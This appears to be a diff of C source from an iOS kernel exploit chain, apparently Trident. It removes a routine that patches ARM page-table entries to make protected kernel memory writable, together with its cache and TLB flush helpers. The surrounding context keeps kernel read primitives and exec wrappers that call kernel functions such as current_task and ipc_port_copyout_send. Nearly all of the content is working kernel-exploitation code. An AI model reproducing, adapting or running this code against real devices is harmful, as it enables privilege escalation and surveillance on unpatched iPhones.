@@ -15,22 +15,6 @@
 
 #define kOSSerializeBinarySignature "\323\0\0"
 
-#define TTB_SIZE                    (4096)
-#define L1_SECT_S_BIT               (1 << 16)
-#define L1_SECT_PROTO               (1 << 1)        /* 0b10 */
-#define L1_SECT_AP_URW              (1 << 10) | (1 << 11)
-#define L1_SECT_APX                 (1 << 15)
-#define L1_SECT_DEFPROT             (L1_SECT_AP_URW | L1_SECT_APX)
-#define L1_SECT_SORDER              (0)             /* 0b00, not cacheable, strongly ordered. */
-#define L1_SECT_DEFCACHE            (L1_SECT_SORDER)
-#define L1_PROTO_TTE(entry)         (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)
-#define L1_PAGE_PROTO               (1 << 0)
-#define L1_COARSE_PT                (0xFFFFFC00)
-#define PT_SIZE                     (256)
-#define L2_PAGE_APX                 (1 << 9)
-
-#define CHUNK_SIZE                  (0x800)
-
 #define WRITE_IN(buf, data)         do { *(uint32_t *)(buf + bufpos) = (data); bufpos += 4; } while(0)
 
 #define KERN_POINTER_VALID(val)     ((val) >= 0x80000000 && (val) != 0xffffffff)
@@ -57,10 +41,6 @@ static unsigned char pExploit[128];
 
 static vm_offset_t vm_kernel_addrperm = 0;
 
-static uint32_t tte_virt = 0;
-static uint32_t tte_phys = 0;
-static uint32_t flush_dcache = 0;
-static uint32_t invalidate_tlb = 0;
 static uint32_t current_task_func = 0;
 static uint32_t ipc_port_make_send_func = 0;
 static uint32_t ipc_port_copyout_send_func = 0;
@@ -206,16 +186,6 @@ static uint32_t kread32_prim(uint32_t addr)
     return clock_get_attributes(clk_battery, addr, &attr, &attrCnt);
 }
 
-static void exec_flush_dcache(void)
-{
-    exec_prim(flush_dcache, 0, 0);
-}
-
-static void exec_invalidate_tlb(void)
-{
-    exec_prim(invalidate_tlb, 0, 0);
-}
-
 static uint32_t exec_current_task(void)
 {
     return (uint32_t)exec_prim(current_task_func, 0, 0);
@@ -230,35 +200,6 @@ static task_t exec_ipc_port_copyout_send(uint32_t arg0, uint32_t arg1)
 {
     return (task_t)exec_prim(ipc_port_copyout_send_func, arg0, arg1);
 }
-
-static void patch_page_table(uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page)
-{
-    uint32_t i = page >> 20;
-    uint32_t j = (page >> 12) & 0xFF;
-    uint32_t addr = tte_virt+(i<<2);
-    uint32_t entry = kread32(addr);
-    if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO)
-    {
-        uint32_t page_entry = ((entry & L1_COARSE_PT) - tte_phys) + tte_virt;
-        uint32_t addr2 = page_entry+(j<<2);
-        uint32_t entry2 = kread32(addr2);
-        if (entry2)
-        {
-            uint32_t new_entry2 = (entry2 & (~L2_PAGE_APX));
-            kwrite32(addr2, new_entry2);
-        }
-    }
-    else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO)
-    {
-        uint32_t new_entry = L1_PROTO_TTE(entry);
-        new_entry &= ~L1_SECT_APX;
-        kwrite32(addr, new_entry);
-    }
-    
-    exec_flush_dcache();
-    exec_invalidate_tlb();
-}
-
 
 int trident_initialize(void)
 {
